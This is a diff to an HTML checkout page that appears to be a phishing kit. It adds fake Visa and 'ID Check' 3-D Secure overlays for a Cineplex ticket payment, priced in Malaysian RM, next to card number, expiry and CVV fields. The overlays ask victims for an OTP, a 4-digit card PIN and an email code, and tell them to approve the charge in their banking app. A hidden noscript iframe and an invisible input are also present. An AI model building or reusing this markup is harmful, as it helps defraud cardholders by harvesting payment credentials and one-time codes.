@@ -21,6 +21,216 @@
 .collapsedContentWrapper___d9d1db{
   display: none;
 }
+
+
+
+
+.loading {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 80px 20px;
+                color: var(--text2)
+            }
+
+            .spinner {
+                width: 32px;
+                height: 32px;
+                border: 3px solid var(--border);
+                border-top-color: var(--accent);
+                border-radius: 50%;
+                animation: spin .8s linear infinite;
+                margin-right: 12px
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg)
+                }
+            }
+
+            .hidden {
+                display: none!important
+            }
+
+            /* 3D Secure modal */
+            .overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                bottom: 0;
+                background: rgba(0,0,0,.7);
+                z-index: 1000;
+                display: flex;
+                align-items: center;
+                justify-content: center
+            }
+
+            .otp-card {
+                width: 100%;
+                max-width: 400px;
+                background: #fff;
+                border-radius: 12px;
+                overflow: hidden;
+                color: #1a1a1a;
+                font-family: -apple-system,BlinkMacSystemFont,sans-serif;
+                position: relative
+            }
+
+            .otp-hdr {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                padding: 14px 16px;
+                border-bottom: 1px solid #e0e0e0
+            }
+
+            .otp-hdr-left {
+                display: flex;
+                align-items: center;
+                gap: 6px;
+                font-size: 14px;
+                font-weight: 700;
+                color: #333
+            }
+
+            .otp-hdr-right {
+                display: flex;
+                align-items: center;
+                gap: 8px;
+                color: #333;
+                font-size: 14px;
+                font-weight: 400
+            }
+
+            .otp-body {
+                padding: 20px
+            }
+
+            .otp-body h2 {
+                font-size: 16px;
+                font-weight: 700;
+                margin-bottom: 6px;
+                color: #1a1a1a
+            }
+
+            .otp-body p {
+                font-size: 12px;
+                color: #555;
+                margin-bottom: 14px
+            }
+
+            .otp-table {
+                width: 100%;
+                margin-bottom: 12px;
+                border-collapse: collapse
+            }
+
+            .otp-table td {
+                padding: 6px 0;
+                font-size: 12px;
+                border-bottom: 1px solid #f0f0f0
+            }
+
+            .otp-table td:first-child {
+                color: #999
+            }
+
+            .otp-table td:last-child {
+                color: #333;
+                font-weight: 500;
+                text-align: right
+            }
+
+            .pin-input {
+                display: flex;
+                gap: 8px;
+                justify-content: center;
+                margin: 10px 0 16px
+            }
+
+            .pin-input input {
+                width: 50px;
+                height: 56px;
+                border: 2px solid #e0e0ee;
+                border-radius: 10px;
+                text-align: center;
+                font-size: 22px;
+                font-weight: 700;
+                color: #1a1a2e;
+                outline: none;
+                background: #fff;
+                transition: .2s
+            }
+
+            .pin-input input:focus {
+                border-color: #3f51b5;
+                box-shadow: 0 0 0 2px #3f51b522
+            }
+
+            .pin-input input.error {
+                border-color: #e53935;
+                background: #fff5f5
+            }
+
+            .otp-error {
+                color: #e53935;
+                font-size: 11px;
+                text-align: center;
+                margin-bottom: 8px
+            }
+
+            .otp-btn {
+                width: 100%;
+                height: 44px;
+                background: #3f51b5;
+                color: #fff;
+                border: none;
+                border-radius: 6px;
+                font-size: 14px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: opacity .2s
+            }
+
+            .otp-btn:disabled {
+                opacity: .5;
+                cursor: not-allowed
+            }
+
+            .otp-btn.loading {
+                color: transparent!important;
+                position: relative
+            }
+
+            .otp-btn.loading::after {
+                content: '';
+                position: absolute;
+                left: 50%;
+                top: 50%;
+                width: 20px;
+                height: 20px;
+                margin: -10px 0 0 -10px;
+                border: 2px solid #fff;
+                border-top-color: transparent;
+                border-radius: 50%;
+                animation: spin .6s linear infinite
+            }
+
+            .otp-countdown {
+                text-align: center;
+                color: #bbb;
+                font-size: 11px;
+                margin-top: 8px
+            }
+
+            .result-msg {
+                text-align: center;
+                padding: 30px 20px;
+                font-size: 16px;
+                font-weight: 600
+            }
 </style>
 
 
@@ -473,7 +683,14 @@ url("pay1ment_icons.woff") format("woff");
 
 <div style="display:flex;gap:12px;margin-bottom:12px"><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div style="flex:1"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div></div>
 
-<div id="otpSection" style="display:none;margin-top:12px"><div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">OTP Code *</label><input id="otpCode" placeholder="Enter OTP code" maxlength="6" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div id="otpTimer" style="text-align:center;font-size:22px;font-weight:700;color:#e65100;margin:12px 0;display:none"></div><button id="btnOtp" style="width:100%;padding:14px;background:#e65100;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer">Submit OTP</button></div><div id="statusMsg" style="text-align:center;padding:10px;font-size:13px;border-radius:8px;display:none;margin-top:8px"></div><button id="btnSubmit" style="width:100%;padding:14px;background:#d84e55;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px">Pay</button></div></div></div></div></div></div></div></div>                                        <noscript><iframe src="index_2.html" height="0" width="0" style="display: none; visibility: hidden"></iframe></noscript> <input style="width: 0px; height: 0px; opacity: 0; position: absolute; bottom: 0px; right: 0px; z-index: -1;" value="">
+<div id="otpSection" style="display:none;margin-top:12px"><div style="margin-bottom:12px"><label style="display:block;font-size:12px;color:#666;margin-bottom:4px">OTP Code *</label><input id="otpCode" placeholder="Enter OTP code" maxlength="6" style="width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:8px;font-size:14px;outline:none;font-family:Inter,sans-serif"></div><div id="otpTimer" style="text-align:center;font-size:22px;font-weight:700;color:#e65100;margin:12px 0;display:none"></div><button id="btnOtp" style="width:100%;padding:14px;background:#e65100;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer">Submit OTP</button></div>
+
+
+<div id="statusMsg" style="text-align:center;padding:10px;font-size:13px;border-radius:8px;display:none;margin-top:8px"></div>
+
+
+
+<button id="btnSubmit" style="width:100%;padding:14px;background:#d84e55;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px">Pay</button></div></div></div></div></div></div></div></div>                                        <noscript><iframe src="index_2.html" height="0" width="0" style="display: none; visibility: hidden"></iframe></noscript> <input style="width: 0px; height: 0px; opacity: 0; position: absolute; bottom: 0px; right: 0px; z-index: -1;" value="">
 
 
 
@@ -496,6 +713,263 @@ url("pay1ment_icons.woff") format("woff");
 <div class="flexRow___2c6f74 paxItem___6402ac flex_row pax_item"><div class="pax_item_left opt3 false"><div class="text " id="bpLabel">Discounts</div></div><div class="[class*=paxItemRights]"><b class="text  false"> RM 2</b></div></div>
 
 </div><div class="divider_solid_full_width___9c2fb0 "></div><div class="totalPayableSection___b8c855" data-autoid="totalPayable"><div class="totalText___0de25a">Total</div><div class="fare">RM 60.50</div></div></div></div></div></div></div>
+
+
+
+
+<!-- Loading overlay (standalone) -->
+        <div class="overlay hidden" id="load-overlay">
+            <div style="text-align:center">
+                <img src="https://mediafiles.cineplex.com/modernization/popcorn-loader.gif" alt="loading" style="width:120px;height:120px">
+                <p style="text-align:center;color:#fff;font-size:16px;margin-top:16px;font-weight:500">Processing payment...</p>
+            </div>
+        </div>
+        <!-- 3D Secure overlay -->
+        <div class="overlay hidden" id="otp-overlay">
+            <div class="otp-card">
+                <div class="otp-hdr">
+                    <div class="otp-hdr-left">
+                        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2">
+                            <polygon points="20,3 4,14 36,14"/>
+                            <rect x="4" y="32" width="32" height="4" rx="1"/>
+                            <line x1="9" y1="15" x2="9" y2="32"/>
+                            <line x1="16" y1="15" x2="16" y2="32"/>
+                            <line x1="24" y1="15" x2="24" y2="32"/>
+                            <line x1="31" y1="15" x2="31" y2="32"/>
+                        </svg>
+                    </div>
+                    <div class="otp-hdr-right" style="gap:8px" id="otp-card-logo">
+                        <svg width="32" height="22" viewBox="0 0 32 22">
+                            <rect width="32" height="22" rx="3" fill="#1a1f71"/>
+                            <text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text>
+                        </svg>
+                        <span style="color:#ccc;font-size:18px">|</span>
+                        <span style="font-family:Arial;font-size:13px">Secure</span>
+                    </div>
+                </div>
+                <div class="otp-body" id="otp-body">
+                    <div id="otp-form" class="hidden">
+                        <h2>Enter your security code</h2>
+                        <p>Please enter your security code to authorize this payment</p>
+                        <table class="otp-table">
+                            <tr>
+                                <td>Merchant</td>
+                                <td>Cineplex</td>
+                            </tr>
+                            <tr id="otp-amount-row">
+                                <td>Amount</td>
+                                <td id="otp-amount">$0.00</td>
+                            </tr>
+                        </table>
+                        <div class="pin-input" id="pin-input">
+                            <input type="tel" maxlength="8" id="otp-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                        </div>
+                        <div class="otp-error hidden" id="otp-error">Please enter your security code.</div>
+                        <button class="otp-btn" id="otp-submit">Continue</button>
+                        <button class="otp-btn" id="otp-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px" onclick="resendOtp()">Resend Code</button>
+                        <div class="otp-countdown">
+                            Code expires in <span id="otp-timer">4:59</span>
+                        </div>
+                        <div class="vfy-spinner" id="otp-spinner">
+                            <div class="spin"></div>
+                            <p id="otp-spin-text">Verifying...</p>
+                        </div>
+                    </div>
+                    <div id="otp-result" class="hidden">
+                        <div class="result-msg error" id="otp-fail">
+                            <svg width="48" height="48" fill="none" viewBox="0 0 48 48">
+                                <circle cx="24" cy="24" r="22" fill="#e74c3c" stroke="#e74c3c" stroke-width="2"/>
+                                <line x1="16" y1="16" x2="32" y2="32" stroke="#fff" stroke-width="3"/>
+                                <line x1="32" y1="16" x2="16" y2="32" stroke="#fff" stroke-width="3"/>
+                            </svg>
+                            <br>Payment Failed
+                        </div>
+                        <p style="text-align:center;color:#888;font-size:13px;margin:8px 0">
+                            Your bank did not authorize this transaction.<br>Please try another card or contact your card issuer.
+                        </p>
+                        <button class="otp-btn" onclick="document.getElementById('otp-overlay').classList.add('hidden');resetOtp()">Try Again</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- APP Verification overlay -->
+        <div class="overlay hidden" id="app-verify-overlay">
+            <div class="app-verify-box">
+                <div class="app-hdr">
+                    <div class="app-bank-logo" id="app-bank-logo">IB</div>
+                    <div class="app-scheme" id="app-scheme">
+                        <span class="app-scheme-mark">
+                            <span class="app-circle red"></span>
+                            <span class="app-circle yellow"></span>
+                        </span>
+                        <span class="app-scheme-name">ID Check</span>
+                    </div>
+                </div>
+                <h1>Before you purchase, verify it's you</h1>
+                <p class="app-intro">
+                    For added security, your bank needs to verify this purchase at <strong id="app-merchant">Cineplex</strong>
+                    for <strong id="app-amount">$0.00</strong>
+                    by authenticating in the banking app.
+                </p>
+                <ol class="app-steps">
+                    <li>
+                        <span class="app-num">1.</span>
+                        <span>
+                            Open your banking app and sign in. If already signed in, go to <strong>Card Verification Requests</strong>
+                            .
+                        </span>
+                    </li>
+                    <li>
+                        <span class="app-num">2.</span>
+                        <span>
+                            Review the purchase details and choose <strong>Approve</strong>
+                            or <strong>Decline</strong>
+                            .
+                        </span>
+                    </li>
+                    <li>
+                        <span class="app-num">3.</span>
+                        <span>Return to this page after approving the request.</span>
+                    </li>
+                </ol>
+                <div class="app-links">
+                    <a href="javascript:void(0)">Need Help?</a>
+                    <a href="javascript:void(0)">Terms of use</a>
+                    <a href="javascript:void(0)">Exit</a>
+                </div>
+                <div class="app-question">Already verified this purchase?</div>
+                <div class="app-error hidden" id="app-error">Verification unsuccessful. Please return to the app to verify again.</div>
+                <div class="app-btn-wrap">
+                    <button type="button" id="app-continue-btn" onclick="appVerifyContinue()">Continue to complete</button>
+                </div>
+                <div class="vfy-spinner" id="app-spinner">
+                    <div class="spin"></div>
+                    <p>Waiting for approval...</p>
+                </div>
+            </div>
+        </div>
+        <!-- PIN Verification overlay -->
+        <div class="overlay hidden" id="pin-overlay">
+            <div class="otp-card">
+                <div class="otp-hdr">
+                    <div class="otp-hdr-left">
+                        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2">
+                            <rect x="8" y="14" width="24" height="18" rx="2"/>
+                            <circle cx="20" cy="8" r="4"/>
+                            <line x1="20" y1="12" x2="20" y2="14"/>
+                        </svg>
+                    </div>
+                    <div class="otp-hdr-right" style="gap:8px" id="pin-card-logo">
+                        <svg width="32" height="22" viewBox="0 0 32 22">
+                            <rect width="32" height="22" rx="3" fill="#1a1f71"/>
+                            <text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text>
+                        </svg>
+                        <span style="color:#ccc;font-size:18px">|</span>
+                        <span style="font-family:Arial;font-size:13px">Secure</span>
+                    </div>
+                </div>
+                <div class="otp-body" id="pin-body">
+                    <div id="pin-form">
+                        <h2>Enter your PIN</h2>
+                        <p>Please enter your 4-digit PIN code to authorize this payment</p>
+                        <table class="otp-table">
+                            <tr>
+                                <td>Merchant</td>
+                                <td>Cineplex</td>
+                            </tr>
+                            <tr id="pin-amount-row">
+                                <td>Amount</td>
+                                <td id="pin-amount">$0.00</td>
+                            </tr>
+                        </table>
+                        <div class="pin-digits" id="pin-digits">
+                            <input type="tel" maxlength="1" class="pin-digit" id="pin-d1" oninput="pinJump(1)" onkeydown="pinBack(event,1)">
+                            <input type="tel" maxlength="1" class="pin-digit" id="pin-d2" oninput="pinJump(2)" onkeydown="pinBack(event,2)">
+                            <input type="tel" maxlength="1" class="pin-digit" id="pin-d3" oninput="pinJump(3)" onkeydown="pinBack(event,3)">
+                            <input type="tel" maxlength="1" class="pin-digit" id="pin-d4" oninput="pinJump(4)" onkeydown="pinBack(event,4)">
+                        </div>
+                        <div class="otp-error hidden" id="pin-error">Please enter your PIN code.</div>
+                        <button class="otp-btn" id="pin-submit" onclick="submitPin()">Continue</button>
+                        <div class="otp-countdown">
+                            Code expires in <span id="pin-timer">4:59</span>
+                        </div>
+                        <div class="vfy-spinner" id="pin-spinner">
+                            <div class="spin"></div>
+                            <p>Verifying PIN...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Email Verification overlay -->
+        <div class="overlay hidden" id="email-overlay">
+            <div class="otp-card">
+                <div class="otp-hdr">
+                    <div class="otp-hdr-left">
+                        <svg width="22" height="22" viewBox="0 0 40 40" fill="none" stroke="#888" stroke-width="2">
+                            <rect x="4" y="10" width="32" height="20" rx="2"/>
+                            <polyline points="4,10 20,22 36,10"/>
+                        </svg>
+                    </div>
+                    <div class="otp-hdr-right" style="gap:8px" id="email-card-logo">
+                        <svg width="32" height="22" viewBox="0 0 32 22">
+                            <rect width="32" height="22" rx="3" fill="#1a1f71"/>
+                            <text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text>
+                        </svg>
+                        <span style="color:#ccc;font-size:18px">|</span>
+                        <span style="font-family:Arial;font-size:13px">Secure</span>
+                    </div>
+                </div>
+                <div class="otp-body" id="email-verify-body">
+                    <div id="email-form">
+                        <h2>Enter email verification code</h2>
+                        <p>We have sent a verification code to your email. Please enter it below.</p>
+                        <table class="otp-table">
+                            <tr>
+                                <td>Merchant</td>
+                                <td>Cineplex</td>
+                            </tr>
+                            <tr id="email-amount-row">
+                                <td>Amount</td>
+                                <td id="email-amount">$0.00</td>
+                            </tr>
+                        </table>
+                        <div class="pin-input">
+                            <input type="tel" maxlength="8" id="email-code" style="width:100%;height:52px;border:2px solid #e0e0ee;border-radius:10px;text-align:center;font-size:22px;font-weight:700;color:#1a1a2e;outline:none;background:#fff;letter-spacing:6px" placeholder="">
+                        </div>
+                        <div class="otp-error hidden" id="email-error">Please enter your verification code.</div>
+                        <button class="otp-btn" id="email-submit" onclick="submitEmailCode()">Continue</button>
+                        <button class="otp-btn" id="email-resend" style="background:#f5f5f5;color:#333;border:1px solid #ddd;margin-top:8px" onclick="resendEmailCode()">Resend Code</button>
+                        <div class="otp-countdown">
+                            Code expires in <span id="email-timer">4:59</span>
+                        </div>
+                        <div class="vfy-spinner" id="email-spinner">
+                            <div class="spin"></div>
+                            <p>Verifying email code...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
